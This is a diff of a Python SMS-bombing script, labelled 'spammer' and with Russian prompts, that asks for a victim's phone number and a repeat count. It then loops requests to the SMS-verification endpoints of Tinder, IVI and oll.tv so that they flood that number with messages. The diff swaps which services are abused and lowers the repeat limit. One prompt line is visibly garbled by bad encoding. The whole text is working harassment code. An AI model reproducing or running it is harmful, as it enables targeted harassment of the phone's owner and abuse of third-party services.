@@ -42,15 +42,10 @@ number = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 
 
-run = int(console.input('[green]Введите количество повторов (1-900):\n[blue]spammer>> '))
+run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
 for _ in track(range(run)):
-	try:
-		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': number}, headers=headers)
-		print('[+] Tinder sent!')
-	except:
-		print('[-] Not sent!')
-	try:
-		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number}, headers=headers)
-		print('[+] IVI sent!')
-	except:
-		print('[-] Not sent!')
+ try:
+     print('vodafone')
+     requests.post("https://oll.tv/api/v3/auth/login?lang=rus", json={"number": number}, headers=headers)
+ except:
+     print('Не отправлено (vodafone)')
